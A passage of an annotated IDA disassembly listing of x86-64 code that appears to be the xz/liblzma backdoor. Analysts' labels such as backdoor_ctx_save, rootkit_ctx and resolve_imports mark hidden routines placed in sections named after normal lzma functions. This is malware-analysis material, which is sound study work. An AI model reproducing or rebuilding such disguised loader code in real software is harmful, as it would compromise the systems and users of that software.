.text.lzma_mf_bt4_fina:0000000000003E43                 mov     rax, 700000006h
.text.lzma_mf_bt4_fina:0000000000003E4D                 mov     [rsp+0E8h+var_C0], rax
.text.lzma_mf_bt4_fina:0000000000003E52                 mov     rax, 900000008h
.text.lzma_mf_bt4_fina:0000000000003E5C                 mov     [rsp+0E8h+var_B8], rax
.text.lzma_mf_bt4_fina:0000000000003E61                 mov     rax, 0B0000000Ah
.text.lzma_mf_bt4_fina:0000000000003E6B                 mov     [rsp+0E8h+var_B0], rax
.text.lzma_mf_bt4_fina:0000000000003E70                 mov     rax, 0D0000000Ch
.text.lzma_mf_bt4_fina:0000000000003E7A                 mov     [rsp+0E8h+var_A8], rax
.text.lzma_mf_bt4_fina:0000000000003E7F                 xor     eax, eax
.text.lzma_mf_bt4_fina:0000000000003E81                 rep stosd
.text.lzma_mf_bt4_fina:0000000000003E83
.text.lzma_mf_bt4_fina:0000000000003E83 loc_3E83:                               ; CODE XREF: _Llzma_mf_bt4_find_0+120↓j
.text.lzma_mf_bt4_fina:0000000000003E83                 mov     eax, [r10+rbx*4]
.text.lzma_mf_bt4_fina:0000000000003E87                 shl     rax, 5
.text.lzma_mf_bt4_fina:0000000000003E8B                 add     rax, r14
.text.lzma_mf_bt4_fina:0000000000003E8E                 mov     rdi, [rax+8]
.text.lzma_mf_bt4_fina:0000000000003E92                 test    rdi, rdi
.text.lzma_mf_bt4_fina:0000000000003E95                 jz      short loc_3EB9
.text.lzma_mf_bt4_fina:0000000000003E97                 mov     rsi, [rax+10h]
.text.lzma_mf_bt4_fina:0000000000003E9B                 mov     rcx, [rsp+0E8h+var_E8]
.text.lzma_mf_bt4_fina:0000000000003E9F                 mov     r9, r12
.text.lzma_mf_bt4_fina:0000000000003EA2                 lea     r8, [r13+rbx*8+0]
.text.lzma_mf_bt4_fina:0000000000003EA7                 mov     rdx, r15
.text.lzma_mf_bt4_fina:0000000000003EAA                 mov     [rsp+0E8h+var_E0], r10
.text.lzma_mf_bt4_fina:0000000000003EAF                 call    sub_2FE0
.text.lzma_mf_bt4_fina:0000000000003EB4                 mov     r10, [rsp+0E8h+var_E0]
.text.lzma_mf_bt4_fina:0000000000003EB9
.text.lzma_mf_bt4_fina:0000000000003EB9 loc_3EB9:                               ; CODE XREF: _Llzma_mf_bt4_find_0+F5↑j
.text.lzma_mf_bt4_fina:0000000000003EB9                 inc     rbx
.text.lzma_mf_bt4_fina:0000000000003EBC                 cmp     rbx, 0Ah
.text.lzma_mf_bt4_fina:0000000000003EC0                 jnz     short loc_3E83
.text.lzma_mf_bt4_fina:0000000000003EC2                 xor     eax, eax
.text.lzma_mf_bt4_fina:0000000000003EC4                 lea     rdi, [rsp+0E8h+var_A0]
.text.lzma_mf_bt4_fina:0000000000003EC9                 lea     rsi, [rsp+0E8h+var_A0]
.text.lzma_mf_bt4_fina:0000000000003ECE                 mov     rcx, rbx
.text.lzma_mf_bt4_fina:0000000000003ED1                 rep stosd
.text.lzma_mf_bt4_fina:0000000000003ED3                 xor     eax, eax
.text.lzma_mf_bt4_fina:0000000000003ED5
.text.lzma_mf_bt4_fina:0000000000003ED5 loc_3ED5:                               ; CODE XREF: _Llzma_mf_bt4_find_0+15E↓j
.text.lzma_mf_bt4_fina:0000000000003ED5                 mov     rdi, [r13+rax*8+0]
.text.lzma_mf_bt4_fina:0000000000003EDA                 xor     edx, edx
.text.lzma_mf_bt4_fina:0000000000003EDC
.text.lzma_mf_bt4_fina:0000000000003EDC loc_3EDC:                               ; CODE XREF: _Llzma_mf_bt4_find_0+14A↓j
.text.lzma_mf_bt4_fina:0000000000003EDC                 mov     ecx, edx
.text.lzma_mf_bt4_fina:0000000000003EDE                 cmp     edx, eax
.text.lzma_mf_bt4_fina:0000000000003EE0                 jnb     short loc_3EF4
.text.lzma_mf_bt4_fina:0000000000003EE2                 inc     rdx
.text.lzma_mf_bt4_fina:0000000000003EE5                 cmp     [r13+rdx*8-8], rdi
.text.lzma_mf_bt4_fina:0000000000003EEA                 jnz     short loc_3EDC
.text.lzma_mf_bt4_fina:0000000000003EEC                 mov     edx, ecx
.text.lzma_mf_bt4_fina:0000000000003EEE                 inc     [rsp+rdx*4+0E8h+var_A0]
.text.lzma_mf_bt4_fina:0000000000003EF2                 jmp     short loc_3EF7
.text.lzma_mf_bt4_fina:0000000000003EF4 ; ---------------------------------------------------------------------------
.text.lzma_mf_bt4_fina:0000000000003EF4
.text.lzma_mf_bt4_fina:0000000000003EF4 loc_3EF4:                               ; CODE XREF: _Llzma_mf_bt4_find_0+140↑j
.text.lzma_mf_bt4_fina:0000000000003EF4                 inc     dword ptr [rsi+rax*4]
.text.lzma_mf_bt4_fina:0000000000003EF7
.text.lzma_mf_bt4_fina:0000000000003EF7 loc_3EF7:                               ; CODE XREF: _Llzma_mf_bt4_find_0+152↑j
.text.lzma_mf_bt4_fina:0000000000003EF7                 inc     rax
.text.lzma_mf_bt4_fina:0000000000003EFA                 cmp     rax, 0Ah
.text.lzma_mf_bt4_fina:0000000000003EFE                 jnz     short loc_3ED5
.text.lzma_mf_bt4_fina:0000000000003F00                 xor     eax, eax
.text.lzma_mf_bt4_fina:0000000000003F02                 xor     edx, edx
.text.lzma_mf_bt4_fina:0000000000003F04                 xor     ecx, ecx
.text.lzma_mf_bt4_fina:0000000000003F06
.text.lzma_mf_bt4_fina:0000000000003F06 loc_3F06:                               ; CODE XREF: _Llzma_mf_bt4_find_0+178↓j
.text.lzma_mf_bt4_fina:0000000000003F06                 mov     edi, [rsi+rax*4]
.text.lzma_mf_bt4_fina:0000000000003F09                 cmp     ecx, edi
.text.lzma_mf_bt4_fina:0000000000003F0B                 jnb     short loc_3F11
.text.lzma_mf_bt4_fina:0000000000003F0D                 mov     edx, eax
.text.lzma_mf_bt4_fina:0000000000003F0F                 mov     ecx, edi
.text.lzma_mf_bt4_fina:0000000000003F11
.text.lzma_mf_bt4_fina:0000000000003F11 loc_3F11:                               ; CODE XREF: _Llzma_mf_bt4_find_0+16B↑j
.text.lzma_mf_bt4_fina:0000000000003F11                 inc     rax
.text.lzma_mf_bt4_fina:0000000000003F14                 cmp     rax, 0Ah
.text.lzma_mf_bt4_fina:0000000000003F18                 jnz     short loc_3F06
.text.lzma_mf_bt4_fina:0000000000003F1A                 cmp     ecx, 4
.text.lzma_mf_bt4_fina:0000000000003F1D                 jbe     loc_3DD7
.text.lzma_mf_bt4_fina:0000000000003F23                 mov     rax, [rsp+rdx*8+0E8h+var_78]
.text.lzma_mf_bt4_fina:0000000000003F28                 test    rax, rax
.text.lzma_mf_bt4_fina:0000000000003F2B                 jz      loc_3DD7
.text.lzma_mf_bt4_fina:0000000000003F31                 mov     [r12+48h], rax
.text.lzma_mf_bt4_fina:0000000000003F36                 mov     eax, 1
.text.lzma_mf_bt4_fina:0000000000003F3B
.text.lzma_mf_bt4_fina:0000000000003F3B loc_3F3B:                               ; CODE XREF: _Llzma_mf_bt4_find_0+39↑j
.text.lzma_mf_bt4_fina:0000000000003F3B                 add     rsp, 0C0h
.text.lzma_mf_bt4_fina:0000000000003F42                 pop     rbx
.text.lzma_mf_bt4_fina:0000000000003F43                 pop     r12
.text.lzma_mf_bt4_fina:0000000000003F45                 pop     r13
.text.lzma_mf_bt4_fina:0000000000003F47                 pop     r14
.text.lzma_mf_bt4_fina:0000000000003F49                 pop     r15
.text.lzma_mf_bt4_fina:0000000000003F4B                 retn
.text.lzma_mf_bt4_fina:0000000000003F4B _Llzma_mf_bt4_find_0 endp
.text.lzma_mf_bt4_fina:0000000000003F4B
.text.lzma_mf_bt4_fina:0000000000003F4B _text_lzma_mf_bt4_fina ends
.text.lzma_mf_bt4_fina:0000000000003F4B
.text.lzma_stream_decoder_inia:0000000000003F50 ; ===========================================================================
.text.lzma_stream_decoder_inia:0000000000003F50
.text.lzma_stream_decoder_inia:0000000000003F50 ; Segment type: Pure code
.text.lzma_stream_decoder_inia:0000000000003F50 ; Segment permissions: Read/Execute
.text.lzma_stream_decoder_inia:0000000000003F50 _text_lzma_stream_decoder_inia segment para public 'CODE' use64
.text.lzma_stream_decoder_inia:0000000000003F50                 assume cs:_text_lzma_stream_decoder_inia
.text.lzma_stream_decoder_inia:0000000000003F50                 ;org 3F50h
.text.lzma_stream_decoder_inia:0000000000003F50                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_stream_decoder_inia:0000000000003F50
.text.lzma_stream_decoder_inia:0000000000003F50 ; =============== S U B R O U T I N E =======================================
.text.lzma_stream_decoder_inia:0000000000003F50
.text.lzma_stream_decoder_inia:0000000000003F50
.text.lzma_stream_decoder_inia:0000000000003F50 ; __int64 __fastcall set_rkctx_cpuid(rootkit_ctx *a1)
.text.lzma_stream_decoder_inia:0000000000003F50 set_rkctx_cpuid proc near               ; CODE XREF: backdoor_ctx_save+1F↓p
.text.lzma_stream_decoder_inia:0000000000003F50                 endbr64
.text.lzma_stream_decoder_inia:0000000000003F54                 mov     rax, offset ro_gots
.text.lzma_stream_decoder_inia:0000000000003F5B                 mov     rax, [rax+8]
.text.lzma_stream_decoder_inia:0000000000003F5F                 mov     [rdi+18h], rax
.text.lzma_stream_decoder_inia:0000000000003F63                 retn
.text.lzma_stream_decoder_inia:0000000000003F63 set_rkctx_cpuid endp
.text.lzma_stream_decoder_inia:0000000000003F63
.text.lzma_stream_decoder_inia:0000000000003F63 _text_lzma_stream_decoder_inia ends
.text.lzma_stream_decoder_inia:0000000000003F63
.text.lzma_stream_flags_compara:0000000000003F70 ; ===========================================================================
.text.lzma_stream_flags_compara:0000000000003F70
.text.lzma_stream_flags_compara:0000000000003F70 ; Segment type: Pure code
.text.lzma_stream_flags_compara:0000000000003F70 ; Segment permissions: Read/Execute
.text.lzma_stream_flags_compara:0000000000003F70 _text_lzma_stream_flags_compara segment para public 'CODE' use64
.text.lzma_stream_flags_compara:0000000000003F70                 assume cs:_text_lzma_stream_flags_compara
.text.lzma_stream_flags_compara:0000000000003F70                 ;org 3F70h
.text.lzma_stream_flags_compara:0000000000003F70                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_stream_flags_compara:0000000000003F70
.text.lzma_stream_flags_compara:0000000000003F70 ; =============== S U B R O U T I N E =======================================
.text.lzma_stream_flags_compara:0000000000003F70
.text.lzma_stream_flags_compara:0000000000003F70
.text.lzma_stream_flags_compara:0000000000003F70 ; rootkit_ctx *__fastcall get_rodata_ptr_offset(rootkit_ctx *)
.text.lzma_stream_flags_compara:0000000000003F70                 public get_rodata_ptr_offset
.text.lzma_stream_flags_compara:0000000000003F70 get_rodata_ptr_offset proc near         ; CODE XREF: get_ehdr_address+E↓p
.text.lzma_stream_flags_compara:0000000000003F70                 endbr64
.text.lzma_stream_flags_compara:0000000000003F74                 mov     rax, offset rodata_ptr_offset
.text.lzma_stream_flags_compara:0000000000003F7B                 mov     rax, [rax+8]
.text.lzma_stream_flags_compara:0000000000003F7F                 mov     [rdi+20h], rax
.text.lzma_stream_flags_compara:0000000000003F83                 retn
.text.lzma_stream_flags_compara:0000000000003F83 get_rodata_ptr_offset endp
.text.lzma_stream_flags_compara:0000000000003F83
.text.lzma_stream_flags_compara:0000000000003F83 _text_lzma_stream_flags_compara ends
.text.lzma_stream_flags_compara:0000000000003F83
.text.lzma_stream_header_encoda:0000000000003F90 ; ===========================================================================
.text.lzma_stream_header_encoda:0000000000003F90
.text.lzma_stream_header_encoda:0000000000003F90 ; Segment type: Pure code
.text.lzma_stream_header_encoda:0000000000003F90 ; Segment permissions: Read/Execute
.text.lzma_stream_header_encoda:0000000000003F90 _text_lzma_stream_header_encoda segment para public 'CODE' use64
.text.lzma_stream_header_encoda:0000000000003F90                 assume cs:_text_lzma_stream_header_encoda
.text.lzma_stream_header_encoda:0000000000003F90                 ;org 3F90h
.text.lzma_stream_header_encoda:0000000000003F90                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_stream_header_encoda:0000000000003F90
.text.lzma_stream_header_encoda:0000000000003F90 ; =============== S U B R O U T I N E =======================================
.text.lzma_stream_header_encoda:0000000000003F90
.text.lzma_stream_header_encoda:0000000000003F90
.text.lzma_stream_header_encoda:0000000000003F90 ; __int64 __fastcall get_ehdr_address(rootkit_ctx *a1)
.text.lzma_stream_header_encoda:0000000000003F90                 public get_ehdr_address
.text.lzma_stream_header_encoda:0000000000003F90 get_ehdr_address proc near              ; CODE XREF: parse_elf_init+D9↓p
.text.lzma_stream_header_encoda:0000000000003F90                 endbr64
.text.lzma_stream_header_encoda:0000000000003F94                 lea     rdx, _Lx86_coder_destroy
.text.lzma_stream_header_encoda:0000000000003F9B                 mov     [rdi], rdx
.text.lzma_stream_header_encoda:0000000000003F9E                 call    get_rodata_ptr_offset ; PIC mode
.text.lzma_stream_header_encoda:0000000000003FA3                 mov     rax, offset rodata_ptr_offset
.text.lzma_stream_header_encoda:0000000000003FAA                 sub     rdx, [rdi+20h]
.text.lzma_stream_header_encoda:0000000000003FAE                 mov     [rdi+8], rdx
.text.lzma_stream_header_encoda:0000000000003FB2                 mov     rax, [rax]
.text.lzma_stream_header_encoda:0000000000003FB5                 mov     rax, [rax+rdx]
.text.lzma_stream_header_encoda:0000000000003FB9                 sar     rax, 38h
.text.lzma_stream_header_encoda:0000000000003FBD                 mov     [rdi+10h], rax
.text.lzma_stream_header_encoda:0000000000003FC1                 xor     eax, eax
.text.lzma_stream_header_encoda:0000000000003FC3                 mov     [rdi+18h], rax
.text.lzma_stream_header_encoda:0000000000003FC7                 retn
.text.lzma_stream_header_encoda:0000000000003FC7 get_ehdr_address endp
.text.lzma_stream_header_encoda:0000000000003FC7
.text.lzma_stream_header_encoda:0000000000003FC7 _text_lzma_stream_header_encoda ends
.text.lzma_stream_header_encoda:0000000000003FC7
.text.lzma_stream_header_encodb:0000000000003FD0 ; ===========================================================================
.text.lzma_stream_header_encodb:0000000000003FD0
.text.lzma_stream_header_encodb:0000000000003FD0 ; Segment type: Pure code
.text.lzma_stream_header_encodb:0000000000003FD0 ; Segment permissions: Read/Execute
.text.lzma_stream_header_encodb:0000000000003FD0 _text_lzma_stream_header_encodb segment para public 'CODE' use64
.text.lzma_stream_header_encodb:0000000000003FD0                 assume cs:_text_lzma_stream_header_encodb
.text.lzma_stream_header_encodb:0000000000003FD0                 ;org 3FD0h
.text.lzma_stream_header_encodb:0000000000003FD0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_stream_header_encodb:0000000000003FD0
.text.lzma_stream_header_encodb:0000000000003FD0 ; =============== S U B R O U T I N E =======================================
.text.lzma_stream_header_encodb:0000000000003FD0
.text.lzma_stream_header_encodb:0000000000003FD0
.text.lzma_stream_header_encodb:0000000000003FD0 ; __int64 __fastcall Llzma_block_param_decoder_0(__int64, int)
.text.lzma_stream_header_encodb:0000000000003FD0 _Llzma_block_param_decoder_0 proc near  ; CODE XREF: parse_elf_init:loc_5A90↓p
.text.lzma_stream_header_encodb:0000000000003FD0
.text.lzma_stream_header_encodb:0000000000003FD0 var_8           = byte ptr -8
.text.lzma_stream_header_encodb:0000000000003FD0
.text.lzma_stream_header_encodb:0000000000003FD0                 endbr64
.text.lzma_stream_header_encodb:0000000000003FD4                 cmp     esi, 1
.text.lzma_stream_header_encodb:0000000000003FD7                 lea     rdx, [rsp+var_8]
.text.lzma_stream_header_encodb:0000000000003FDC                 sbb     rax, rax
.text.lzma_stream_header_encodb:0000000000003FDF                 and     rax, 0FFFFFFFFFFFFF098h
.text.lzma_stream_header_encodb:0000000000003FE5                 lea     ecx, [rax+0FE8h]
.text.lzma_stream_header_encodb:0000000000003FEB                 xor     eax, eax
.text.lzma_stream_header_encodb:0000000000003FED
.text.lzma_stream_header_encodb:0000000000003FED loc_3FED:                               ; CODE XREF: _Llzma_block_param_decoder_0+2B↓j
.text.lzma_stream_header_encodb:0000000000003FED                 xor     esi, esi
.text.lzma_stream_header_encodb:0000000000003FEF                 inc     eax
.text.lzma_stream_header_encodb:0000000000003FF1                 sub     rdx, 8
.text.lzma_stream_header_encodb:0000000000003FF5                 mov     [rdx+8], rsi
.text.lzma_stream_header_encodb:0000000000003FF9                 cmp     ecx, eax
.text.lzma_stream_header_encodb:0000000000003FFB                 jnz     short loc_3FED
.text.lzma_stream_header_encodb:0000000000003FFD                 retn
.text.lzma_stream_header_encodb:0000000000003FFD _Llzma_block_param_decoder_0 endp
.text.lzma_stream_header_encodb:0000000000003FFD
.text.lzma_stream_header_encodb:0000000000003FFD _text_lzma_stream_header_encodb ends
.text.lzma_stream_header_encodb:0000000000003FFD
.text.parse_delt1:0000000000004000 ; ===========================================================================
.text.parse_delt1:0000000000004000
.text.parse_delt1:0000000000004000 ; Segment type: Pure code
.text.parse_delt1:0000000000004000 ; Segment permissions: Read/Execute
.text.parse_delt1:0000000000004000 _text_parse_delt1 segment para public 'CODE' use64
.text.parse_delt1:0000000000004000                 assume cs:_text_parse_delt1
.text.parse_delt1:0000000000004000                 ;org 4000h
.text.parse_delt1:0000000000004000                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.parse_delt1:0000000000004000
.text.parse_delt1:0000000000004000 ; =============== S U B R O U T I N E =======================================
.text.parse_delt1:0000000000004000
.text.parse_delt1:0000000000004000
.text.parse_delt1:0000000000004000 ; void *__fastcall set_rkctx_self(rootkit_ctx *a1)
.text.parse_delt1:0000000000004000 set_rkctx_self  proc near               ; CODE XREF: backdoor_ctx_save+1A↓p
.text.parse_delt1:0000000000004000                 endbr64
.text.parse_delt1:0000000000004004                 mov     rax, offset ro_gots
.text.parse_delt1:000000000000400B                 mov     rax, [rax]
.text.parse_delt1:000000000000400E                 mov     [rdi+20h], rax
.text.parse_delt1:0000000000004012                 retn
.text.parse_delt1:0000000000004012 set_rkctx_self  endp
.text.parse_delt1:0000000000004012
.text.parse_delt1:0000000000004012 _text_parse_delt1 ends
.text.parse_delt1:0000000000004012
.text.read_output_and_waia:0000000000004020 ; ===========================================================================
.text.read_output_and_waia:0000000000004020
.text.read_output_and_waia:0000000000004020 ; Segment type: Pure code
.text.read_output_and_waia:0000000000004020 ; Segment permissions: Read/Execute
.text.read_output_and_waia:0000000000004020 _text_read_output_and_waia segment para public 'CODE' use64
.text.read_output_and_waia:0000000000004020                 assume cs:_text_read_output_and_waia
.text.read_output_and_waia:0000000000004020                 ;org 4020h
.text.read_output_and_waia:0000000000004020                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.read_output_and_waia:0000000000004020
.text.read_output_and_waia:0000000000004020 ; =============== S U B R O U T I N E =======================================
.text.read_output_and_waia:0000000000004020
.text.read_output_and_waia:0000000000004020 ; 0x7ffff7fab240
.text.read_output_and_waia:0000000000004020
.text.read_output_and_waia:0000000000004020 ; __int64 __fastcall backdoor_ctx_save(rootkit_ctx *ctx)
.text.read_output_and_waia:0000000000004020 backdoor_ctx_save proc near             ; CODE XREF: backdoor_init+13↓p
.text.read_output_and_waia:0000000000004020                 endbr64
.text.read_output_and_waia:0000000000004024 ; 4:   *a1 = (__int64)&Lrc_read_destroy;
.text.read_output_and_waia:0000000000004024                 lea     rax, addr_hinter
.text.read_output_and_waia:000000000000402B                 mov     [rdi], rax
.text.read_output_and_waia:000000000000402E ; 5:   a1[2] = *(_QWORD *)(a1[5] + 24);
.text.read_output_and_waia:000000000000402E                 mov     rax, [rdi+28h]
.text.read_output_and_waia:0000000000004032                 mov     rax, [rax+18h]
.text.read_output_and_waia:0000000000004036                 mov     [rdi+10h], rax
.text.read_output_and_waia:000000000000403A ; 6:   Lparse_delta_0();
.text.read_output_and_waia:000000000000403A                 call    set_rkctx_self  ; PIC mode
.text.read_output_and_waia:000000000000403F ; 7:   Llzma_stream_decoder_init_1();
.text.read_output_and_waia:000000000000403F                 call    set_rkctx_cpuid ; PIC mode
.text.read_output_and_waia:0000000000004044 ; 8:   result = 0LL;
.text.read_output_and_waia:0000000000004044                 xor     eax, eax
.text.read_output_and_waia:0000000000004046 ; 9:   a1[1] = 0LL;
.text.read_output_and_waia:0000000000004046                 mov     [rdi+8], rax
.text.read_output_and_waia:000000000000404A ; 10:   return result;
.text.read_output_and_waia:000000000000404A                 retn
.text.read_output_and_waia:000000000000404A backdoor_ctx_save endp
.text.read_output_and_waia:000000000000404A
.text.read_output_and_waia:000000000000404A _text_read_output_and_waia ends
.text.read_output_and_waia:000000000000404A
.text.stream_decoder_memconfia:0000000000004050 ; ===========================================================================
.text.stream_decoder_memconfia:0000000000004050
.text.stream_decoder_memconfia:0000000000004050 ; Segment type: Pure code
.text.stream_decoder_memconfia:0000000000004050 ; Segment permissions: Read/Execute
.text.stream_decoder_memconfia:0000000000004050 _text_stream_decoder_memconfia segment para public 'CODE' use64
.text.stream_decoder_memconfia:0000000000004050                 assume cs:_text_stream_decoder_memconfia
.text.stream_decoder_memconfia:0000000000004050                 ;org 4050h
.text.stream_decoder_memconfia:0000000000004050                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.stream_decoder_memconfia:0000000000004050
.text.stream_decoder_memconfia:0000000000004050 ; =============== S U B R O U T I N E =======================================
.text.stream_decoder_memconfia:0000000000004050
.text.stream_decoder_memconfia:0000000000004050
.text.stream_decoder_memconfia:0000000000004050 ; lzma_allocator *__fastcall get_lzma_allocator(_QWORD)
.text.stream_decoder_memconfia:0000000000004050                 public get_lzma_allocator
.text.stream_decoder_memconfia:0000000000004050 get_lzma_allocator proc near            ; CODE XREF: sub_2540+2A↑p
.text.stream_decoder_memconfia:0000000000004050                                         ; resolve_imports+53↓p ...
.text.stream_decoder_memconfia:0000000000004050                 endbr64
.text.stream_decoder_memconfia:0000000000004054                 mov     edi, 21h ; '!'
.text.stream_decoder_memconfia:0000000000004059                 call    get_lzma_allocator_addr ; PIC mode
.text.stream_decoder_memconfia:000000000000405E                 add     rax, 8
.text.stream_decoder_memconfia:0000000000004062                 retn
.text.stream_decoder_memconfia:0000000000004062 get_lzma_allocator endp
.text.stream_decoder_memconfia:0000000000004062
.text.stream_decoder_memconfia:0000000000004062 _text_stream_decoder_memconfia ends
.text.stream_decoder_memconfia:0000000000004062
.text.lzma_delta_props_encoda:0000000000004070 ; ===========================================================================
.text.lzma_delta_props_encoda:0000000000004070
.text.lzma_delta_props_encoda:0000000000004070 ; Segment type: Pure code
.text.lzma_delta_props_encoda:0000000000004070 ; Segment permissions: Read/Execute
.text.lzma_delta_props_encoda:0000000000004070 _text_lzma_delta_props_encoda segment para public 'CODE' use64
.text.lzma_delta_props_encoda:0000000000004070                 assume cs:_text_lzma_delta_props_encoda
.text.lzma_delta_props_encoda:0000000000004070                 ;org 4070h
.text.lzma_delta_props_encoda:0000000000004070                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_delta_props_encoda:0000000000004070
.text.lzma_delta_props_encoda:0000000000004070 ; =============== S U B R O U T I N E =======================================
.text.lzma_delta_props_encoda:0000000000004070
.text.lzma_delta_props_encoda:0000000000004070
.text.lzma_delta_props_encoda:0000000000004070 ; __int64 __fastcall resolve_imports(_QWORD *, unsigned __int64 *, _QWORD *, __int64)
.text.lzma_delta_props_encoda:0000000000004070                 public resolve_imports
.text.lzma_delta_props_encoda:0000000000004070 resolve_imports proc near               ; CODE XREF: _Llzma_lz_decoder_init_0+157↓p
.text.lzma_delta_props_encoda:0000000000004070
.text.lzma_delta_props_encoda:0000000000004070 var_60          = qword ptr -60h
.text.lzma_delta_props_encoda:0000000000004070 lzma_allocator2 = qword ptr -58h
.text.lzma_delta_props_encoda:0000000000004070 var_50          = qword ptr -50h
.text.lzma_delta_props_encoda:0000000000004070 var_48          = qword ptr -48h
.text.lzma_delta_props_encoda:0000000000004070 var_40          = qword ptr -40h
.text.lzma_delta_props_encoda:0000000000004070 var_38          = qword ptr -38h
.text.lzma_delta_props_encoda:0000000000004070 var_30          = qword ptr -30h
.text.lzma_delta_props_encoda:0000000000004070
.text.lzma_delta_props_encoda:0000000000004070                 endbr64
.text.lzma_delta_props_encoda:0000000000004074                 push    r15
.text.lzma_delta_props_encoda:0000000000004076                 push    r14
.text.lzma_delta_props_encoda:0000000000004078                 mov     r14, rcx
.text.lzma_delta_props_encoda:000000000000407B                 mov     ecx, 5
.text.lzma_delta_props_encoda:0000000000004080                 push    r13
.text.lzma_delta_props_encoda:0000000000004082                 push    r12
.text.lzma_delta_props_encoda:0000000000004084                 mov     r12, rdi
.text.lzma_delta_props_encoda:0000000000004087                 xor     edi, edi
.text.lzma_delta_props_encoda:0000000000004089                 push    rbx
.text.lzma_delta_props_encoda:000000000000408A                 sub     rsp, 40h
.text.lzma_delta_props_encoda:000000000000408E                 mov     [rsp+68h+var_40], rsi
.text.lzma_delta_props_encoda:0000000000004093                 mov     esi, 6Ch ; 'l'
.text.lzma_delta_props_encoda:0000000000004098                 mov     [rsp+68h+var_48], rdx
.text.lzma_delta_props_encoda:000000000000409D                 mov     edx, 10h
.text.lzma_delta_props_encoda:00000000000040A2                 call    apply_one_entry_ex ; PIC mode
.text.lzma_delta_props_encoda:00000000000040A7                 test    eax, eax
.text.lzma_delta_props_encoda:00000000000040A9                 jz      loc_41C2
.text.lzma_delta_props_encoda:00000000000040AF                 mov     rax, [r12]
.text.lzma_delta_props_encoda:00000000000040B3                 mov     edi, 1          ; _QWORD
.text.lzma_delta_props_encoda:00000000000040B8                 mov     rbx, [r14+118h]
.text.lzma_delta_props_encoda:00000000000040BF                 mov     r13, [rax+10h]
.text.lzma_delta_props_encoda:00000000000040C3                 call    get_lzma_allocator ; PIC mode
.text.lzma_delta_props_encoda:00000000000040C8                 mov     edi, 8A8h
.text.lzma_delta_props_encoda:00000000000040CD                 mov     [rsp+68h+var_60], rax
.text.lzma_delta_props_encoda:00000000000040D2                 mov     rax, [r12+8]
.text.lzma_delta_props_encoda:00000000000040D7                 mov     rcx, [rsp+68h+var_60]
.text.lzma_delta_props_encoda:00000000000040DC                 mov     rax, [rax+10h]
.text.lzma_delta_props_encoda:00000000000040E0                 mov     rsi, rcx
.text.lzma_delta_props_encoda:00000000000040E3                 mov     [rcx+10h], rax
.text.lzma_delta_props_encoda:00000000000040E7                 call    lzma_alloc      ; PIC mode
.text.lzma_delta_props_encoda:00000000000040EC                 mov     [rbx+18h], rax
.text.lzma_delta_props_encoda:00000000000040F0                 test    rax, rax
.text.lzma_delta_props_encoda:00000000000040F3                 jz      short loc_40F7
.text.lzma_delta_props_encoda:00000000000040F5                 inc     dword ptr [rbx]
.text.lzma_delta_props_encoda:00000000000040F7
.text.lzma_delta_props_encoda:00000000000040F7 loc_40F7:                               ; CODE XREF: resolve_imports+83↑j
.text.lzma_delta_props_encoda:00000000000040F7                 mov     rsi, [rsp+68h+var_60]
.text.lzma_delta_props_encoda:00000000000040FC                 mov     edi, 428h
.text.lzma_delta_props_encoda:0000000000004101                 call    lzma_alloc      ; PIC mode
.text.lzma_delta_props_encoda:0000000000004106                 mov     [rbx+58h], rax
.text.lzma_delta_props_encoda:000000000000410A                 test    rax, rax
.text.lzma_delta_props_encoda:000000000000410D                 jz      short loc_4111
.text.lzma_delta_props_encoda:000000000000410F                 inc     dword ptr [rbx]
.text.lzma_delta_props_encoda:0000000000004111
.text.lzma_delta_props_encoda:0000000000004111 loc_4111:                               ; CODE XREF: resolve_imports+9D↑j
.text.lzma_delta_props_encoda:0000000000004111                 mov     rsi, [rsp+68h+var_60]
.text.lzma_delta_props_encoda:0000000000004116                 mov     edi, 5F0h
.text.lzma_delta_props_encoda:000000000000411B                 call    lzma_alloc      ; PIC mode
.text.lzma_delta_props_encoda:0000000000004120                 mov     [rbx+20h], rax
.text.lzma_delta_props_encoda:0000000000004124                 test    rax, rax
.text.lzma_delta_props_encoda:0000000000004127                 jz      short loc_412B
.text.lzma_delta_props_encoda:0000000000004129                 inc     dword ptr [rbx]
.text.lzma_delta_props_encoda:000000000000412B
.text.lzma_delta_props_encoda:000000000000412B loc_412B:                               ; CODE XREF: resolve_imports+B7↑j
.text.lzma_delta_props_encoda:000000000000412B                 mov     edi, 1          ; _QWORD
.text.lzma_delta_props_encoda:0000000000004130                 call    get_lzma_allocator ; PIC mode
.text.lzma_delta_props_encoda:0000000000004135                 mov     esi, 0A60h      ; hash
.text.lzma_delta_props_encoda:000000000000413A                 mov     [rsp+68h+lzma_allocator2], rax
.text.lzma_delta_props_encoda:000000000000413F                 mov     rax, [r12+8]
.text.lzma_delta_props_encoda:0000000000004144                 mov     rcx, [rsp+68h+lzma_allocator2]
.text.lzma_delta_props_encoda:0000000000004149                 mov     rdx, [rax+20h]
.text.lzma_delta_props_encoda:000000000000414D                 mov     rdi, [rax+8]    ; a1
.text.lzma_delta_props_encoda:0000000000004151                 mov     [rcx+10h], rdx
.text.lzma_delta_props_encoda:0000000000004155                 xor     edx, edx        ; a3
.text.lzma_delta_props_encoda:0000000000004157                 call    import_lookup_get_str ; PIC mode
.text.lzma_delta_props_encoda:000000000000415C                 mov     r15, rax
.text.lzma_delta_props_encoda:000000000000415F                 test    rax, rax
.text.lzma_delta_props_encoda:0000000000004162                 jz      short loc_41C2
.text.lzma_delta_props_encoda:0000000000004164                 mov     rsi, [rsp+68h+lzma_allocator2]
.text.lzma_delta_props_encoda:0000000000004169                 mov     edi, 4E0h
.text.lzma_delta_props_encoda:000000000000416E                 call    lzma_alloc      ; PIC mode
.text.lzma_delta_props_encoda:0000000000004173                 mov     [r14+68h], rax
.text.lzma_delta_props_encoda:0000000000004177                 test    rax, rax
.text.lzma_delta_props_encoda:000000000000417A                 jz      short loc_4183
.text.lzma_delta_props_encoda:000000000000417C                 inc     dword ptr [r14+120h]
.text.lzma_delta_props_encoda:0000000000004183
